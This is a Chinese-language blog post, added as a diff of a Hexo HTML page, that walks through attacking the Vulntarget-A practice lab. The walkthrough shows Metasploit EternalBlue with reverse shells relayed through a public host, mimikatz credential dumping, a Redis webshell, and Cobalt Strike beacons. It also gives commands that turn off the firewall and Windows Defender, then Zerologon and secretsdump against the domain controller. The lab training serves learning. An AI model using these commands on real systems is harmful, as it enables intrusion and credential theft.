@@ -1,0 +1,913 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Sp4rks3">
+  <meta name="keywords" content="博客">
+  
+    <meta name="description" content="前言靶机地址：Vulntarget 👋 网络拓扑：  WIN 7外网地址：192.168.158.203 攻击机：192.168.112.147 公网主机：47.XX.X.XX 攻击机使用WIN11与WSL2 KALI （镜像网络，强烈推荐，各种代理确实方便）  WIN 7信息收集用最低5000的速率扫描192.168.158.203全端口 1sudo nmap -sT --min-rate 5">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网靶场渗透实战-Vulntarget-A">
+<meta property="og:url" content="https://sp4rks3.github.io/2024/08/31/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98-Vulntarget-A/index.html">
+<meta property="og:site_name" content="Sp4rks3&#39;s Blog">
+<meta property="og:description" content="前言靶机地址：Vulntarget 👋 网络拓扑：  WIN 7外网地址：192.168.158.203 攻击机：192.168.112.147 公网主机：47.XX.X.XX 攻击机使用WIN11与WSL2 KALI （镜像网络，强烈推荐，各种代理确实方便）  WIN 7信息收集用最低5000的速率扫描192.168.158.203全端口 1sudo nmap -sT --min-rate 5">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240822001242022.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902131412262.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902143707020.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902143738793.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902144433511.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902150748030.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902151352591.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902152047108.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902152725018.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902153030789.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902153300193.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902153805343.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902160323058.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902154810047.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902155253524.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902164242466.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902164612977.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902172415420.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902172556198.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902172911362.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902173010096.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902173050266.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902195541700.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902200630990.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902200915404.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902201249415.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902202824986.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902203430848.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902204434347.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902204319927.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902204533451.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902204715493.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902210716523.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902211239171.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902211331701.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902211858834.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902212352022.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902105142202.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902105814766.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902221722603.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902222457300.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902222527659.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902222611366.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902222718394.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902223029810.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902223727949.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902223803004.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902212438602.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902225853099.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902225250187.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2024/09/image-20240902225526376.png">
+<meta property="article:published_time" content="2024-08-31T12:31:13.120Z">
+<meta property="article:modified_time" content="2024-09-03T10:10:51.894Z">
+<meta property="article:author" content="Sp4rks3">
+<meta property="article:tag" content="内网靶场渗透实战">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://image.sp4rks.xyz/2024/09/image-20240822001242022.png">
+  
+  
+  
+  <title>内网靶场渗透实战-Vulntarget-A - Sp4rks3&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sp4rks3.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null},"woyaola":null,"cnzz":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Sp4rks3&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="内网靶场渗透实战-Vulntarget-A"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-08-31 20:31" pubdate>
+          2024年8月31日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          17 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">内网靶场渗透实战-Vulntarget-A</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>靶机地址：<a target="_blank" rel="noopener" href="https://github.com/crow821/vulntarget">Vulntarget 👋</a></p>
+<p>网络拓扑：</p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240822001242022.png" srcset="/img/loading.gif" lazyload alt="image-20240822001242022"></p>
+<p><strong>WIN 7外网地址：192.168.158.203</strong></p>
+<p><strong>攻击机：192.168.112.147</strong></p>
+<p><strong>公网主机：47.XX.X.XX</strong></p>
+<p>攻击机使用WIN11与WSL2 KALI （镜像网络，强烈推荐，各种代理确实方便）</p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902131412262.png" srcset="/img/loading.gif" lazyload alt="image-20240902131412262"></p>
+<h1 id="WIN-7"><a href="#WIN-7" class="headerlink" title="WIN 7"></a>WIN 7</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>用最低5000的速率扫描192.168.158.203全端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -sT --min-rate <span class="hljs-number">5000</span> -p- <span class="hljs-number">192.168.158.203</span><br></code></pre></td></tr></table></figure>
+
+
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902143707020.png" srcset="/img/loading.gif" lazyload alt="image-20240902143707020"></p>
+<p>看到暴露的端口，我们心底需要对其重要性做一个排序，例如这里，首要攻击点肯定是<strong>80</strong>或者<strong>445</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -sT -sV -sC -O -p80,<span class="hljs-number">135</span>,<span class="hljs-number">139</span>,<span class="hljs-number">445</span> <span class="hljs-number">192.168.158.203</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902143738793.png" srcset="/img/loading.gif" lazyload alt="image-20240902143738793"></p>
+<p>对端口做更详细的扫描，看到是WIN7的主机，并且暴露了<strong>445</strong>端口，那不经让我们想到 <strong>MS17-101</strong>，继续使用NMAP自带的漏洞扫描脚本，看看有没有低摘的果子</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -sT --script=vuln -p80,<span class="hljs-number">135</span>,<span class="hljs-number">138</span>,<span class="hljs-number">445</span> <span class="hljs-number">192.168.158.203</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902144433511.png" srcset="/img/loading.gif" lazyload alt="image-20240902144433511"></p>
+<p>坐实了永恒之蓝，优先级肯定是比<strong>80</strong>端口高，直接用MSF打就行</p>
+<h2 id="永恒之蓝利用"><a href="#永恒之蓝利用" class="headerlink" title="永恒之蓝利用"></a>永恒之蓝利用</h2><p>同时注意到我们的靶机的IP为<strong>192.168.158.203</strong>，攻击机的IP为<strong>192.168.112.147</strong>，那这MSF肯定不能直接使用反向SHELL，因为不在一个网段，反弹不回来</p>
+<p>解决办法暂时可以想到两点：</p>
+<ol>
+<li>使用正向的payload，但是同时又有问题，假如靶机的防火墙开着(事实上也确实开着)，那这个方法也不行,我们根本连接不到靶机的其他端口</li>
+<li>使用公网主机当跳板机</li>
+</ol>
+<hr>
+<p>Frpc配置文件：</p>
+<p>将本机的4444端口，转发到公网主机的4445</p>
+<p>本机6000-&gt;公网主机6000；本机8000-&gt;公网主机8000；本机9000-&gt;公网主机9000；</p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902150748030.png" srcset="/img/loading.gif" lazyload alt="image-20240902150748030"></p>
+<p>Frps配置文件：</p>
+<p>公网主机连接7000端口就行</p>
+<hr>
+<p>开启<code>msf</code>，搜索<code>search ms17-010</code></p>
+<p>使用<code>set exploit/windows/smb/ms17_010_eternalblue</code></p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902151352591.png" srcset="/img/loading.gif" lazyload alt="image-20240902151352591"></p>
+<p><code>show options</code>查看需要的参数</p>
+<p>设置 RHOSTS、LHOST、LPORT</p>
+<p>注意要将LHOST、LPORT设置刚刚Frp转发到的公网主机的IP和端口</p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902152047108.png" srcset="/img/loading.gif" lazyload alt="image-20240902152047108"></p>
+<p>另外开一个MSF监听</p>
+<p>加载监听模块 <code>use exploit/multi/handler</code></p>
+<p>设置反向payload <code>set payload windows/x64/meterpreter/reverse_tcp</code></p>
+<p>先run起来</p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902152725018.png" srcset="/img/loading.gif" lazyload alt="image-20240902152725018"></p>
+<p>然后再run前面的攻击模块	</p>
+<p>可以参考这篇文章<a target="_blank" rel="noopener" href="https://forum.butian.net/share/1832">看我用内网MSF打公网永恒之蓝</a></p>
+<hr>
+<p>看到是双网卡的机器</p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902153030789.png" srcset="/img/loading.gif" lazyload alt="image-20240902153030789"></p>
+<p>没有杀软</p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902153300193.png" srcset="/img/loading.gif" lazyload alt="image-20240902153300193"></p>
+<p>退出终端，加载<code>mimikataz</code>模块；抓一下密码，看到用户名是win7；密码是admin，并且不在域内</p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902153805343.png" srcset="/img/loading.gif" lazyload alt="image-20240902153805343"></p>
+<p><code>run get_local_subnets</code>查看本地网络连接子网段</p>
+<p>添加一条动态路由<code>run autoroute -s 10.0.20.0/24</code></p>
+<p>看一下存活主机<code>use post/windows/gather/arp_scanner</code></p>
+<p>可以看到<strong>10.0.20.99</strong>这台机器</p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902160323058.png" srcset="/img/loading.gif" lazyload alt="image-20240902160323058"></p>
+<h3 id="WIN7上线CS"><a href="#WIN7上线CS" class="headerlink" title="WIN7上线CS"></a>WIN7上线CS</h3><h4 id="方式一-MSF会话注入CS"><a href="#方式一-MSF会话注入CS" class="headerlink" title="方式一:MSF会话注入CS"></a>方式一:MSF会话注入CS</h4><p>已经拿到meterpreter，可以直接利用MSF会话注入CS</p>
+<p>使用payload_inject模块<code>use exploit/windows/local/payload_inject</code></p>
+<p>HOST设置成为公网主机地址，端口设置成刚刚FRP转发的端口6000</p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902154810047.png" srcset="/img/loading.gif" lazyload alt="image-20240902154810047"></p>
+<p><code>sessions -l</code>查看当前会话</p>
+<p>我这里会话ID是1，直接使用，<code>set disablepayloadhandler true</code>不让MSF启动监听器</p>
+<p>CS监听公网主机的地址和6000端口</p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902155253524.png" srcset="/img/loading.gif" lazyload alt="image-20240902155253524"></p>
+<p>讲一下为什么这样设置，<code>payload_inject</code>模块<code>LHOST</code>如果设置成192.168.112.147，LPORT为4444的话，payload会试图直接连接到攻击机的地址和端口 (<code>192.168.112.147:4444</code>)，这个连接肯定无法建立，因为 <code>192.168.112.147</code> 是一个私有 IP 地址，不可通过公网直接访问。当你设置 <code>LHOST</code> 为 <code>公网主机地址</code> 和 <code>LPORT</code> 为 <code>6000</code> 时，payload 会连接到外网主机的 IP 和端口，通过 FRP，已经将攻击机的 <code>6000</code> 端口穿透到公网的 <code>6000</code> 端口。因此，靶机可以通过公网访问到这个地址，并成功上线到 CS。</p>
+<h4 id="方式二：上传后门"><a href="#方式二：上传后门" class="headerlink" title="方式二：上传后门"></a>方式二：上传后门</h4><p>使用刚刚的监听器生成后门</p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902164242466.png" srcset="/img/loading.gif" lazyload alt="image-20240902164242466"></p>
+<p>通过MSF上传文件命令 <code>upload</code>上传，<code>execute</code>执行</p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902164612977.png" srcset="/img/loading.gif" lazyload alt="image-20240902164612977"></p>
+<h2 id="通达OA利用"><a href="#通达OA利用" class="headerlink" title="通达OA利用"></a>通达OA利用</h2><p>上面我们提到了80端口，看到是通达oa，通达历史上也爆过很多漏洞，GitHub很多开源的工具，直接梭哈</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/xiaokp7/TongdaOATool">通达OA漏洞利用工具v1.6</a></p>
+<h1 id="Server-2016"><a href="#Server-2016" class="headerlink" title="Server 2016"></a>Server 2016</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p>在上面查看一下存活主机的时候看到一个IP地址为<strong>10.0.20.99</strong>的机器</p>
+<p>我们不能直接和<strong>10.0.20.99</strong>通信，WIN7可以，直接使用WIN7做一个socks代理</p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902172415420.png" srcset="/img/loading.gif" lazyload alt="image-20240902172415420"></p>
+<p>修改proxychains的配置</p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902172556198.png" srcset="/img/loading.gif" lazyload alt="image-20240902172556198"></p>
+<p>通过nmap扫描目标IP的常用端口</p>
+<p><code>proxychains nmap -sT -Pn 10.0.20.99 -p22,23,80,139,445,1433,3306,3389,6379,8080</code></p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902172911362.png" srcset="/img/loading.gif" lazyload alt="image-20240902172911362"></p>
+<p>对于扫描结果我们同样也是值得关注的，<strong>80</strong>与6379端口</p>
+<p><strong>6379</strong>端口如果是未授权访问或者是知道密钥的情况下的利用方式有：WEBSHELL、计划任务、写入SSH公钥等等</p>
+<p>去看看80端口是什么东西，同样的，我们不能直接访问，还是利用刚刚的socks代理</p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902173010096.png" srcset="/img/loading.gif" lazyload alt="image-20240902173010096"></p>
+<p>Proxifier是windows下面类似于proxychains的软件，由于我们WSL2是镜像网络，那Proxifier直接使用刚刚的socks端口即可；访问10.0.20.99我们看到是一个WEB页面</p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902173050266.png" srcset="/img/loading.gif" lazyload alt="image-20240902173050266"></p>
+<p>直接dirsearch开扫，l.php和phpinfo.php都暴露了绝对路径</p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902195541700.png" srcset="/img/loading.gif" lazyload alt="image-20240902195541700"></p>
+<h2 id="Redis未授权利用"><a href="#Redis未授权利用" class="headerlink" title="Redis未授权利用"></a>Redis未授权利用</h2><p><img src="https://image.sp4rks.xyz/2024/09/image-20240902200630990.png" srcset="/img/loading.gif" lazyload alt="image-20240902200630990"></p>
+<p>根据前边80站点拿到的路径，通过<code>redis-cli</code>咱们直接写入webshell；</p>
+<p>随后哥斯拉启动！</p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902200915404.png" srcset="/img/loading.gif" lazyload alt="image-20240902200915404"></p>
+<h3 id="Server2016上线CS"><a href="#Server2016上线CS" class="headerlink" title="Server2016上线CS"></a>Server2016上线CS</h3><p>同样的两种方式：</p>
+<ol>
+<li>因为我们已经上线了WIN7，那转发上线，用哥斯拉上传后门(这样需要关闭WIN7防火墙)</li>
+<li>生成一个正向的监听器和后门，前面通过哥斯拉已经得到SHELL，用哥斯拉上传后门(这样需要关闭Server2016防火墙)</li>
+</ol>
+<p>殊途同归，我这里使用转发上线</p>
+<p>WIN7关闭防火墙命令</p>
+<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">netsh advfirewall <span class="hljs-built_in">set</span> allprofiles <span class="hljs-keyword">state</span> off<br></code></pre></td></tr></table></figure>
+
+<p>建监听器</p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902201249415.png" srcset="/img/loading.gif" lazyload alt="image-20240902201249415"></p>
+<p>使用刚刚的监听器创建后门</p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902202824986.png" srcset="/img/loading.gif" lazyload alt="image-20240902202824986"></p>
+<p>哥斯拉上传并执行后门，CS上线一气呵成；</p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902203430848.png" srcset="/img/loading.gif" lazyload alt="image-20240902203430848"></p>
+<h2 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h2><p><code>ipconfig /all</code>一样的双网卡，在域内</p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902204434347.png" srcset="/img/loading.gif" lazyload alt="image-20240902204434347"></p>
+<p><code>tasklist /svc</code>显示当前系统中正在运行的所有进程及其关联的服务</p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902204319927.png" srcset="/img/loading.gif" lazyload alt="image-20240902204319927"><br>很好奇啊，有杀软为啥没有杀后门啊</p>
+<p>关闭Windows Defender</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">REG ADD <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot;</span> /v DisableAntiSpyware /t REG_DWORD /d 1 /f<br><br>gpupdate /force<br></code></pre></td></tr></table></figure>
+
+<p><code>quser</code>显示当前登录到本地计算机或远程计算机上的用户信息</p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902204533451.png" srcset="/img/loading.gif" lazyload alt="image-20240902204533451"></p>
+<p><code>netsh advfirewall show allprofiles</code>查看一下防火墙</p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902204715493.png" srcset="/img/loading.gif" lazyload alt="image-20240902204715493"></p>
+<p>可以看到 入站流量默认被阻止，出站流量默认被允许</p>
+<p>手动关一下<code>netSh advfirewall set allprofiles state off</code></p>
+<p>通过端口扫描，发现了一台新的机器 <strong>10.0.10.110</strong></p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902210716523.png" srcset="/img/loading.gif" lazyload alt="image-20240902210716523"></p>
+<h3 id="定位域控"><a href="#定位域控" class="headerlink" title="定位域控"></a>定位域控</h3><p><img src="https://image.sp4rks.xyz/2024/09/image-20240902211239171.png" srcset="/img/loading.gif" lazyload alt="image-20240902211239171"></p>
+<p>查找域控计算机名 <code>net group &quot;domain controllers&quot; /domain</code></p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902211331701.png" srcset="/img/loading.gif" lazyload alt="image-20240902211331701"></p>
+<p>从而得知，域控主机名字为 WIN2019，IP地址为10.0.10.110</p>
+<h1 id="Server-2019"><a href="#Server-2019" class="headerlink" title="Server 2019"></a>Server 2019</h1><p>同样的我们现在的socket代理是WIN7的，只能和Server2016通信，并不能直接通信域控主机，Server2016能和域控通信，我们通过Server2016建立Socket代理</p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902211858834.png" srcset="/img/loading.gif" lazyload alt="image-20240902211858834"></p>
+<p>proxychians改一下配置文件</p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902212352022.png" srcset="/img/loading.gif" lazyload alt="image-20240902212352022"></p>
+<h2 id="CVE-2020-1472"><a href="#CVE-2020-1472" class="headerlink" title="CVE-2020-1472"></a>CVE-2020-1472</h2><p>接着拿域控大杀器Zerologon漏洞打一下（CVE-2020-1472）</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SecuraBV/CVE-2020-1472">https://github.com/SecuraBV/CVE-2020-1472</a></p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902105142202.png" srcset="/img/loading.gif" lazyload alt="image-20240902105142202"></p>
+<p>就可以看到是检测出来有漏洞的</p>
+<p>利用<code>https://github.com/dirkjanm/CVE-2020-1472</code>先将密码置空</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a></p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902105814766.png" srcset="/img/loading.gif" lazyload alt="image-20240902105814766"></p>
+<p>下载impacket工具包</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/fortra/impacket">https://github.com/fortra/impacket</a></p>
+<p>利用impacket工具包中examples目录下的secretsdump.py获取hash值</p>
+<p>得到了hash<code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15:::</code></p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902221722603.png" srcset="/img/loading.gif" lazyload alt="image-20240902221722603"></p>
+<p>利用<code>smbexex.py</code>或 <code>wmiexec.py</code>横向移动，拿下<strong>域控</strong></p>
